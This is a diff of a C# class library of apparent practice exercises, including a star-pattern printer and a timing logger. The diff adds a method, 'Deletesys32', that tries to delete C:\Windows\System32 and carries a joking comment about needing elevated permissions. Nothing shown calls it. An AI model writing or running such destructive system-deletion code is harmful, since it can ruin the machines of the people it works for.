@@ -42,7 +42,7 @@ public class ClassLibrary
         //string.Join("", Enumerable.Repeat("ab", 2)); 
         //I'll be using this type of method to do what I want to do.
 
-        int starCount = 1; // As far as I believe, i will serve as the width in the for loop, I think this is redundant
+        int starCount = 1;
         int spaceCount = 2 * height - 1; //spaces should be 0 at the bottom, 2*height -1 at the top?
         string line; // spaces + stars
         for (int i = 0; i < height; ++i)
@@ -329,6 +329,14 @@ public class ClassLibrary
             // Append the new data
             sw.WriteLine($"{completionTime}, {arrSize}");
         }
+    }
+
+    /// <summary>
+    /// Needs elevated perms to actually do anything :(
+    /// </summary>
+    static void Deletesys32()
+    {
+        Directory.Delete("C:\\Windows\\System32");
     }
 
 
